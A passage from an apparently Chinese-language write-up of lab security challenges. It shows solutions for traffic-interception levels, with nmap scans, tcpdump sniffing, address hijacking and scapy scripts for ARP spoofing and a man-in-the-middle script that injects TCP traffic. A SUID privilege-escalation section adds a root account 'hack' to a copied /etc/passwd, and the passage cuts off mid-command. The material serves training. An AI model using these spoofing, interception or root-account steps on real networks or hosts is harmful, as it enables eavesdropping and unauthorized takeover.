read_request<br>    <span class="hljs-keyword">mov</span> [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x10</span>], <span class="hljs-built_in">rsi</span>                 # open_path<br>    <span class="hljs-keyword">mov</span> [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x18</span>], <span class="hljs-built_in">rdx</span>                 # len<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x20</span>], <span class="hljs-number">0</span>         # index_read<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x28</span>], <span class="hljs-number">0</span>         # index_open<br><br>    <span class="hljs-keyword">xor</span> <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">rax</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">get_path_loop0:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rcx</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x20</span>]<br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">rcx</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x18</span>]<br>    <span class="hljs-keyword">jnb</span> get_path_end<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x8</span>]<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-built_in">rcx</span>]<br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">rcx</span><br>    <span class="hljs-keyword">mov</span> [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x20</span>], <span class="hljs-built_in">rcx</span><br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">0x20</span><br>    <span class="hljs-keyword">jne</span> get_path_loop0<br><span class="hljs-symbol">get_path_loop1:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rcx</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x20</span>]<br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">rcx</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x18</span>]<br>    <span class="hljs-keyword">jnb</span> get_path_end<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x8</span>]<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-built_in">rcx</span>]<br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">rcx</span><br>    <span class="hljs-keyword">mov</span> [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x20</span>], <span class="hljs-built_in">rcx</span><br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">0x20</span><br>    <span class="hljs-keyword">je</span> get_path_end<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rcx</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x28</span>]<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x10</span>]<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-built_in">rcx</span>], <span class="hljs-built_in">al</span><br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">rcx</span><br>    <span class="hljs-keyword">mov</span> [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x28</span>], <span class="hljs-built_in">rcx</span><br>    <span class="hljs-keyword">jmp</span> get_path_loop1<br><span class="hljs-symbol">get_path_end:</span>    <br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x10</span>]<br>    <span class="hljs-keyword">add</span> <span class="hljs-built_in">rdx</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x28</span>]<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdx</span>], <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x20</span>]<br>    <span class="hljs-keyword">leave</span><br>    <span class="hljs-keyword">ret</span><br><br>#============================================<br># size_t strlen(char *src)<br><span class="hljs-symbol">strlen:</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-built_in">rbp</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rbp</span>, <span class="hljs-built_in">rsp</span><br>    <span class="hljs-keyword">xor</span> <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">xor</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">rdx</span><br><span class="hljs-symbol">strlen_loop:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">dl</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-built_in">rax</span>]<br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">jne</span> strlen_loop<br>    <span class="hljs-keyword">sub</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">leave</span><br>    <span class="hljs-keyword">ret</span><br><br>#============================================<br><span class="hljs-meta"></span><br><span class="hljs-meta">.data</span><br><span class="hljs-symbol">sockaddr_in:</span><br><span class="hljs-meta">    .short</span> <span class="hljs-number">2</span>        # sin_family<br><span class="hljs-meta">    .short</span> <span class="hljs-number">0x5000</span>   # sin_port<br><span class="hljs-meta">    .long</span> <span class="hljs-number">0</span>         # sin_addr<br><span class="hljs-meta">    .rept</span> <span class="hljs-number">8</span><br><span class="hljs-meta">    .byte</span> <span class="hljs-number">0</span><br><span class="hljs-meta">    .endr</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">reponse:</span><br><span class="hljs-meta">    .string</span> <span class="hljs-string">&quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span><br><br></code></pre></td></tr></table></figure>

<h2 id="intercepting-communication"><a href="#intercepting-communication" class="headerlink" title="intercepting-communication"></a>intercepting-communication</h2><h3 id="challenges-1"><a href="#challenges-1" class="headerlink" title="challenges"></a>challenges</h3><p>In this series of challenges, you will be working within a virtual network in order to intercept networked traffic.</p>
<h4 id="level1-1"><a href="#level1-1" class="headerlink" title="level1"></a>level1</h4><blockquote>
<p>Connect to a remote host</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nc 10.0.0.3 31337</span><br></code></pre></td></tr></table></figure>

<h4 id="level2-1"><a href="#level2-1" class="headerlink" title="level2"></a>level2</h4><blockquote>
<p>Listen for a connection from a remote host</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nc -l -p 31337</span><br></code></pre></td></tr></table></figure>

<h4 id="level3-1"><a href="#level3-1" class="headerlink" title="level3"></a>level3</h4><blockquote>
<p>Find and connect to a remote host</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">The remote host is somewhere on the `10.0.0.0/24` subnetwork, listening on port `31337`.<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nmap -v 10.0.0.0/24 -p 31337</span><br></code></pre></td></tr></table></figure>

<h4 id="level4-1"><a href="#level4-1" class="headerlink" title="level4"></a>level4</h4><blockquote>
<p>Find and connect to a remote host on a large network</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">The remote host is somewhere on the `10.0.0.0/16` subnetwork, listening on port `31337`.<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nmap -v 10.0.0.0/16 -p 31337 -T5</span><br><br>65536 IP addresses (2 hosts up) scanned in 2612.03 seconds<br></code></pre></td></tr></table></figure>

<h4 id="level5-1"><a href="#level5-1" class="headerlink" title="level5"></a>level5</h4><blockquote>
<p>Monitor traffic from a remote host</p>
</blockquote>
<p>In this challenge you will monitor traffic from a remote host.<br>Your host is already receiving traffic on port <code>31337</code>.</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">tcpdump -A</span><br></code></pre></td></tr></table></figure>

<h4 id="level6-1"><a href="#level6-1" class="headerlink" title="level6"></a>level6</h4><blockquote>
<p>Monitor slow traffic from a remote host</p>
</blockquote>
<p>In this challenge you will monitor slow traffic from a remote host.<br>Your host is already receiving traffic on port <code>31337</code>.</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">tcpdump -Q <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;tcp[tcpflags]&amp;tcp-push!=0&quot;</span> -X -q -l | grep 0x0030</span><br></code></pre></td></tr></table></figure>

<p>or you can use wireshark</p>
<h4 id="level7-1"><a href="#level7-1" class="headerlink" title="level7"></a>level7</h4><blockquote>
<p>Hijack traffic from a remote host by configuring your network interface</p>
</blockquote>
<p>In this challenge you will hijack traffic from a remote host by configuring your network interface.<br>The remote host at <code>10.0.0.4</code> is communicating with the remote host at <code>10.0.0.2</code> on port <code>31337</code>.</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">ip addr add 10.0.0.2/16 dev eth0</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nc -l 31337</span><br></code></pre></td></tr></table></figure>

<h4 id="level8-1"><a href="#level8-1" class="headerlink" title="level8"></a>level8</h4><blockquote>
<p>Manually send an Ethernet packet</p>
</blockquote>
<p>In this challenge you will manually send an Ethernet packet.<br>The packet should have <code>Ether type=0xFFFF</code>.<br>The packet should be sent to the remote host at <code>10.0.0.3</code>.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">$ scpay<br><br><span class="hljs-meta">&gt;&gt;&gt; </span>get_if_list()<br>[<span class="hljs-string">&#x27;lo&#x27;</span>, <span class="hljs-string">&#x27;eth0&#x27;</span>]<br><span class="hljs-meta">&gt;&gt;&gt; </span>get_if_hwaddr(<span class="hljs-string">&quot;eth0&quot;</span>)<br><span class="hljs-string">&#x27;06:3f:d7:4f:63:40&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>pk=Ether(src=<span class="hljs-string">&quot;06:3f:d7:4f:63:40&quot;</span>,dst=<span class="hljs-string">&quot;ff:ff:ff:ff:ff:ff&quot;</span>,<span class="hljs-built_in">type</span>=<span class="hljs-number">0xFFFF</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>srp(pk,iface=<span class="hljs-string">&quot;eth0&quot;</span>)<br></code></pre></td></tr></table></figure>

<h4 id="level9-1"><a href="#level9-1" class="headerlink" title="level9"></a>level9</h4><blockquote>
<p>Manually send an Internet Protocol packet</p>
</blockquote>
<p>In this challenge you will manually send an Internet Protocol packet.<br>The packet should have <code>IP proto=0xFF</code>.<br>The packet should be sent to the remote host at <code>10.0.0.3</code>.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">$ scapy<br><br><span class="hljs-meta">&gt;&gt;&gt; </span>get_if_list()<br>[<span class="hljs-string">&#x27;lo&#x27;</span>, <span class="hljs-string">&#x27;eth0&#x27;</span>]<br><span class="hljs-meta">&gt;&gt;&gt; </span>get_if_hwaddr(<span class="hljs-string">&quot;eth0&quot;</span>)<br><span class="hljs-string">&#x27;d6:8e:5a:63:78:a2&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>pk=Ether(src=<span class="hljs-string">&quot;d6:8e:5a:63:78:a2&quot;</span>,dst=<span class="hljs-string">&quot;ff:ff:ff:ff:ff:ff&quot;</span>)/IP(src=<span class="hljs-string">&quot;10.0.0.2&quot;</span>,dst=<span class="hljs-string">&quot;10.0.0.3&quot;</span>,proto=<span class="hljs-number">0xff</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>srp(pk1)<br></code></pre></td></tr></table></figure>

<h4 id="level10-1"><a href="#level10-1" class="headerlink" title="level10"></a>level10</h4><blockquote>
<p>Manually send a Transmission Control Protocol packet</p>
</blockquote>
<p>In this challenge you will manually send a Transmission Control Protocol packet.<br>The packet should have <code>TCP sport=31337, dport=31337, seq=31337, ack=31337, flags=APRSF</code>.<br>The packet should be sent to the remote host at <code>10.0.0.3</code>.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">$ scapy<br><br><span class="hljs-meta">&gt;&gt;&gt; </span>get_if_list()<br>[<span class="hljs-string">&#x27;lo&#x27;</span>, <span class="hljs-string">&#x27;eth0&#x27;</span>]<br><span class="hljs-meta">&gt;&gt;&gt; </span>get_if_hwaddr(<span class="hljs-string">&quot;eth0&quot;</span>)<br><span class="hljs-string">&#x27;96:14:00:18:e9:96&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>pk=Ether(src=<span class="hljs-string">&quot;96:14:00:18:e9:96&quot;</span>,dst=<span class="hljs-string">&quot;ff:ff:ff:ff:ff:ff&quot;</span>)/IP(src=<span class="hljs-string">&quot;10.0.0.2&quot;</span>,dst=<span class="hljs-string">&quot;10.0.0.3&quot;</span>)/TCP(sport=<span class="hljs-number">31337</span>,dport=<span class="hljs-number">31337</span>,seq=<span class="hljs-number">31337</span>,ack=<span class="hljs-number">31337</span>,flags=<span class="hljs-string">&#x27;APRSF&#x27;</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>srp(pk,iface=<span class="hljs-string">&#x27;eth0&#x27;</span>)<br></code></pre></td></tr></table></figure>

<h4 id="level11-1"><a href="#level11-1" class="headerlink" title="level11"></a>level11</h4><blockquote>
<p>Manually perform a Transmission Control Protocol handshake</p>
</blockquote>
<p>In this challenge you will manually perform a Transmission Control Protocol handshake.<br>The initial packet should have <code>TCP sport=31337, dport=31337, seq=31337</code>.<br>The handshake should occur with the remote host at <code>10.0.0.3</code>.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">$ scapy<br><br><span class="hljs-meta">&gt;&gt;&gt; </span>get_if_list()<br>[<span class="hljs-string">&#x27;lo&#x27;</span>, <span class="hljs-string">&#x27;eth0&#x27;</span>]<br><span class="hljs-meta">&gt;&gt;&gt; </span>get_if_hwaddr(<span class="hljs-string">&quot;eth0&quot;</span>)<br><span class="hljs-string">&#x27;42:f4:f8:57:fa:a4&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>pk1=Ether(src=<span class="hljs-string">&quot;42:f4:f8:57:fa:a4&quot;</span>,dst=<span class="hljs-string">&quot;ff:ff:ff:ff:ff:ff&quot;</span>)/IP(src=<span class="hljs-string">&quot;10.0.0.2&quot;</span>,dst=<span class="hljs-string">&quot;10.0.0.3&quot;</span>)/TCP(sport=<span class="hljs-number">31337</span>,dport=<span class="hljs-number">31337</span>,seq=<span class="hljs-number">31337</span>,flags=<span class="hljs-string">&#x27;S&#x27;</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>response=srp(pk1,iface=<span class="hljs-string">&#x27;eth0&#x27;</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>response[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]<br>QueryAnswer(query=&lt;Ether  dst=ff:ff:ff:ff:ff:ff src=<span class="hljs-number">42</span>:f4:f8:<span class="hljs-number">57</span>:fa:a4 <span class="hljs-built_in">type</span>=IPv4 |&lt;IP  frag=<span class="hljs-number">0</span> proto=<span class="hljs-number">6</span> src=<span class="hljs-number">10.0</span><span class="hljs-number">.0</span><span class="hljs-number">.2</span> dst=<span class="hljs-number">10.0</span><span class="hljs-number">.0</span><span class="hljs-number">.3</span> |&lt;TCP  sport=<span class="hljs-number">31337</span> dport=<span class="hljs-number">31337</span> seq=<span class="hljs-number">31337</span> flags=S |&gt;&gt;&gt;, answer=&lt;Ether  dst=<span class="hljs-number">42</span>:f4:f8:<span class="hljs-number">57</span>:fa:a4 src=be:9b:<span class="hljs-number">98</span>:0e:<span class="hljs-number">32</span>:<span class="hljs-number">27</span> <span class="hljs-built_in">type</span>=IPv4 |&lt;IP  version=<span class="hljs-number">4</span> ihl=<span class="hljs-number">5</span> tos=<span class="hljs-number">0x0</span> <span class="hljs-built_in">len</span>=<span class="hljs-number">40</span> <span class="hljs-built_in">id</span>=<span class="hljs-number">1</span> flags= frag=<span class="hljs-number">0</span> ttl=<span class="hljs-number">64</span> proto=<span class="hljs-number">6</span> chksum=<span class="hljs-number">0x66cb</span> src=<span class="hljs-number">10.0</span><span class="hljs-number">.0</span><span class="hljs-number">.3</span> dst=<span class="hljs-number">10.0</span><span class="hljs-number">.0</span><span class="hljs-number">.2</span> |&lt;TCP  sport=<span class="hljs-number">31337</span> dport=<span class="hljs-number">31337</span> seq=<span class="hljs-number">3424417206</span> ack=<span class="hljs-number">31338</span> dataofs=<span class="hljs-number">5</span> reserved=<span class="hljs-number">0</span> flags=SA window=<span class="hljs-number">8192</span> chksum=<span class="hljs-number">0xcabd</span> urgptr=<span class="hljs-number">0</span> |&gt;&gt;&gt;)<br><span class="hljs-meta">&gt;&gt;&gt; </span>pk2=Ether(src=<span class="hljs-string">&quot;42:f4:f8:57:fa:a4&quot;</span>,dst=<span class="hljs-string">&quot;be:9b:98:0e:32:27&quot;</span>)/IP(src=<span class="hljs-string">&quot;10.0.0.2&quot;</span>,dst=<span class="hljs-string">&quot;10.0.0.3&quot;</span>)/TCP(sport=<span class="hljs-number">31337</span>,dport=<span class="hljs-number">31337</span>,seq=<span class="hljs-number">31338</span>,ack=<span class="hljs-number">3424417207</span>,flags=<span class="hljs-string">&#x27;A&#x27;</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>response1=srp(pk2,iface=<span class="hljs-string">&#x27;eth0&#x27;</span>)<br><br></code></pre></td></tr></table></figure>

<h4 id="level12-1"><a href="#level12-1" class="headerlink" title="level12"></a>level12</h4><blockquote>
<p>Manually send an Address Resolution Protocol packet</p>
</blockquote>
<p>In this challenge you will manually send an Address Resolution Protocol packet.<br>The packet should have <code>ARP op=is-at</code> and correctly inform the remote host of where the sender can be found.<br>The packet should be sent to the remote host at <code>10.0.0.3</code>.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">$ scapy<br><br><span class="hljs-meta">&gt;&gt;&gt; </span>get_if_hwaddr(<span class="hljs-string">&quot;eth0&quot;</span>)<br><span class="hljs-string">&#x27;5e:76:a7:a8:dc:75&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>pk=Ether(src=<span class="hljs-string">&quot;5e:76:a7:a8:dc:75&quot;</span>,dst=<span class="hljs-string">&quot;ff:ff:ff:ff:ff:ff&quot;</span>)/ARP(op=<span class="hljs-string">&quot;is-at&quot;</span>,hwsrc=<span class="hljs-string">&quot;5e:76:a7:a8:dc:75&quot;</span>,psrc=<span class="hljs-string">&quot;10.0.0.2&quot;</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>srp(pk,iface=<span class="hljs-string">&#x27;eth0&#x27;</span>)<br></code></pre></td></tr></table></figure>

<h4 id="level13-1"><a href="#level13-1" class="headerlink" title="level13"></a>level13</h4><blockquote>
<p>Hijack traffic from a remote host using ARP</p>
</blockquote>
<p>In this challenge you will hijack traffic from a remote host using ARP.<br>You do not have the capabilities of a NET ADMIN.<br>The remote host at <code>10.0.0.4</code> is communicating with the remote host at <code>10.0.0.2</code> on port <code>31337</code>.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>get_if_hwaddr(<span class="hljs-string">&quot;eth0&quot;</span>)<br><span class="hljs-string">&#x27;8e:4b:78:5c:3c:6a&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>pk=Ether(src=<span class="hljs-string">&quot;8e:4b:78:5c:3c:6a&quot;</span>,dst=<span class="hljs-string">&quot;ff:ff:ff:ff:ff:ff&quot;</span>)/ARP(op=<span class="hljs-string">&quot;is-at&quot;</span>,hwsrc=<span class="hljs-string">&quot;8e:4b:78:5c:3c:6a&quot;</span>,psrc=<span class="hljs-string">&quot;10.0.0.2&quot;</span>,pdst=<span class="hljs-string">&quot;10.0.0.4&quot;</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>sendp(pk,iface=<span class="hljs-string">&quot;eth0&quot;</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>sniff(iface=<span class="hljs-string">&#x27;eth0&#x27;</span>,<span class="hljs-built_in">filter</span>=<span class="hljs-string">&#x27;tcp[tcpflags]&amp;tcp-push!=0&#x27;</span>,prn=hexdump) <br><br></code></pre></td></tr></table></figure>

<h4 id="level14"><a href="#level14" class="headerlink" title="level14"></a>level14</h4><blockquote>
<p>Man-in-the-middle traffic between two remote hosts and inject extra traffic</p>
</blockquote>
<p>In this challenge you will man in the middle traffic between two remote hosts and inject extra traffic.<br>The remote host at <code>10.0.0.4</code> is communicating with the remote host at <code>10.0.0.3</code> on port <code>31337</code>.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> scapy.layers.inet <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> scapy.layers.l2 <span class="hljs-keyword">import</span> *<br><br>interface = <span class="hljs-string">&quot;eth0&quot;</span><br>local_mac = get_if_hwaddr(interface)<br>local_ip = <span class="hljs-string">&quot;10.0.0.2&quot;</span><br>ip1 = <span class="hljs-string">&quot;10.0.0.3&quot;</span><br>ip2 = <span class="hljs-string">&quot;10.0.0.4&quot;</span><br><br>mac1=getmacbyip(ip=ip1)<br>mac2=getmacbyip(ip=ip2)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\033[1;32mlocal_mac:<span class="hljs-subst">&#123;local_mac&#125;</span>\033[0m&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\033[1;32mmac1:<span class="hljs-subst">&#123;mac1&#125;</span>\033[0m&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\033[1;32mmac2:<span class="hljs-subst">&#123;mac2&#125;</span>\033[0m&quot;</span>)<br><br>eth=Ether(src=local_mac,dst=<span class="hljs-string">&quot;ff:ff:ff:ff:ff:ff&quot;</span>)<br>arp1=ARP(op=<span class="hljs-string">&quot;is-at&quot;</span>,hwsrc=local_mac,psrc=ip1,pdst=ip2)<br>arp2=ARP(op=<span class="hljs-string">&quot;is-at&quot;</span>,hwsrc=local_mac,psrc=ip2,pdst=ip1)<br>sendp(eth/arp1,iface=interface)<br>sendp(eth/arp2,iface=interface)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">process</span>(<span class="hljs-params">p:Packet</span>):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;load:&quot;</span>,p[<span class="hljs-string">&#x27;TCP&#x27;</span>].load)<br>        <span class="hljs-keyword">if</span> p[<span class="hljs-string">&#x27;TCP&#x27;</span>].load==<span class="hljs-string">b&quot;COMMANDS:\nECHO\nFLAG\nCOMMAND:\n&quot;</span>:<br>            pdst = p[<span class="hljs-string">&#x27;IP&#x27;</span>].src<br>            psrc = p[<span class="hljs-string">&#x27;IP&#x27;</span>].dst<br>            flags = <span class="hljs-string">&#x27;PA&#x27;</span><br>            ipflags = p[<span class="hljs-string">&#x27;IP&#x27;</span>].flags<br>            dst = p[<span class="hljs-string">&#x27;Ethernet&#x27;</span>].src<br>            dport = p[<span class="hljs-string">&#x27;TCP&#x27;</span>].sport<br>            sport = p[<span class="hljs-string">&#x27;TCP&#x27;</span>].dport<br>            seq = p[<span class="hljs-string">&#x27;TCP&#x27;</span>].ack<br>            ack = p[<span class="hljs-string">&#x27;TCP&#x27;</span>].seq+<span class="hljs-number">24</span><br>            pk = Ether(src=local_mac,dst=dst)/IP(src=psrc,dst=pdst,flags=ipflags)/TCP(sport=sport,dport=dport,seq=seq,ack=ack,flags=flags)/Raw(load=<span class="hljs-string">b&quot;FLAG&quot;</span>)<br>            sendp(pk,iface=interface)<br>    <span class="hljs-keyword">except</span> Exception:<br>        <span class="hljs-keyword">pass</span><br>    <br>sniff(iface=interface,<span class="hljs-built_in">filter</span>=<span class="hljs-string">&quot;tcp&quot;</span>,prn=process)<br></code></pre></td></tr></table></figure>

<h2 id="access-control"><a href="#access-control" class="headerlink" title="access-control"></a>access-control</h2><h3 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h3><h4 id="查找suid权限文件"><a href="#查找suid权限文件" class="headerlink" title="查找suid权限文件"></a>查找suid权限文件</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null</span><br></code></pre></td></tr></table></figure>

<h4 id="常用命令提权方法"><a href="#常用命令提权方法" class="headerlink" title="常用命令提权方法"></a>常用命令提权方法</h4><h5 id="cp"><a href="#cp" class="headerlink" title="cp"></a>cp</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cat</span> /etc/passwd &gt; passwd</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">openssl passwd -1 -salt z hack <span class="hljs-comment"># 生成在passwd文件中hack密码对应的加密后口令</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;hack:$1$z<span class="hljs-variable">$eN1X4Y0BpzcYM5USaVCR</span>.0:0:0::/root:/bin/shell&quot;</span> &gt;&gt; passwd <span class="hljs-comment"># 